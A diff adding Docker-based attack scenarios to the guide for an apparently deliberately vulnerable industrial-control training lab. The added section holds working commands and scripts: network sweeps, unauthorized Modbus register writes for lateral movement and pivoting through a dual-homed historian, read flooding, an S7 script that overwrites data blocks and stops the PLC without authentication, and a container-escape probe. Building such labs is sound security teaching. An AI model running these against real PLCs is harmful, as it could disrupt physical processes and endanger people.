@@ -23,6 +23,165 @@ This document provides detailed attack scenarios against the vulnerable PLC envi
 
 ---
 
+## Docker Deployment Attack Scenarios
+
+### Using Docker for Realistic Network Attacks
+
+With the Docker deployment, you can perform more realistic network-based attacks that simulate real-world ICS environments with proper network segmentation.
+
+#### Setup: Start Docker Environment
+
+```bash
+# Start core services
+docker-compose up -d
+
+# Or start with full monitoring (IDS, Network Sim, S7)
+docker-compose --profile full up -d
+
+# Verify all containers are running
+docker-compose ps
+```
+
+#### Docker Attack Scenario 1: Cross-Container Attack
+
+**Objective:** Attack from one PLC to another within the OT network
+
+```bash
+# Enter PLC-1 container
+docker-compose exec plc1 bash
+
+# From inside PLC-1, scan the OT network
+nmap -sn 192.168.100.0/24
+
+# Attack PLC-2 from inside PLC-1 (lateral movement)
+python3 -c "
+from pymodbus.client.sync import ModbusTcpClient
+client = ModbusTcpClient('192.168.100.11', port=5503)
+client.write_register(10, 9999)  # Unauthorized write
+client.close()
+"
+
+# Check IDS alerts (if running with --profile full)
+docker-compose logs modbus_ids | grep ALERT
+```
+
+#### Docker Attack Scenario 2: Network Segmentation Bypass
+
+**Objective:** Pivot from DMZ to OT network
+
+```bash
+# The Historian is dual-homed (both DMZ and OT networks)
+# This simulates a common misconfiguration
+
+# Enter Historian container
+docker-compose exec historian bash
+
+# You're now in the DMZ with access to OT network
+# Scan OT network from Historian
+ping -c 1 192.168.100.10  # PLC-1
+ping -c 1 192.168.100.11  # PLC-2
+
+# Attack PLCs from Historian
+modbus write 192.168.100.10:5502 0 1
+```
+
+#### Docker Attack Scenario 3: PCAP Forensics Practice
+
+**Objective:** Perform attack while capturing traffic, then analyze
+
+```bash
+# Start full environment with IDS
+docker-compose --profile full up -d
+
+# Perform attacks (flooding, unauthorized writes)
+for i in {1..100}; do
+  modbus read localhost:5502 $i 1
+done
+
+# Wait a moment for PCAP to be written
+sleep 5
+
+# Copy PCAP from IDS container
+docker cp vuln-modbus-ids:/app/pcaps/ ./captured_traffic/
+
+# Analyze with Wireshark or tcpdump
+wireshark captured_traffic/*.pcap
+# or
+tcpdump -r captured_traffic/*.pcap -nn 'port 502'
+```
+
+#### Docker Attack Scenario 4: S7 Protocol Exploitation
+
+**Objective:** Exploit S7 protocol (if running with --profile full)
+
+```bash
+# Install snap7 library
+pip install python-snap7
+
+# Connect to S7 server
+python3 << 'EOF'
+import snap7
+
+# Connect (no authentication!)
+plc = snap7.client.Client()
+plc.connect('localhost', 0, 1, 102)
+
+print(f"Connected. PLC State: {plc.get_cpu_state()}")
+
+# Read data block
+data = plc.db_read(1, 0, 10)
+print(f"Read DB1: {data.hex()}")
+
+# Write to data block
+plc.db_write(1, 0, bytearray([0xFF, 0xFF]))
+
+# CRITICAL: Stop PLC (no auth required!)
+plc.plc_stop()
+print("PLC stopped!")
+
+plc.disconnect()
+EOF
+```
+
+#### Docker Attack Scenario 5: Container Escape
+
+**Objective:** Attempt container escape (educational)
+
+```bash
+# Enter any container
+docker-compose exec plc1 bash
+
+# Check container capabilities
+capsh --print
+
+# Try to access host
+ls /proc/1/root/
+
+# Note: Containers should be properly isolated
+# This demonstrates why container security matters
+```
+
+#### Monitoring Attacks in Docker
+
+**View real-time System Monitor dashboard:**
+```bash
+# Open browser to http://localhost:5999
+# Watch live metrics during attacks
+```
+
+**View IDS alerts:**
+```bash
+docker-compose logs -f modbus_ids
+```
+
+**View physical process consequences:**
+```bash
+docker-compose logs -f physical_process
+# Watch for overflow, rupture, thermal runaway alerts
+```
+
+---
+
 ## Scenario 1: Complete Compromise via Web Exploitation
 
 **Objective:** Gain full control of all PLCs through web application vulnerabilities
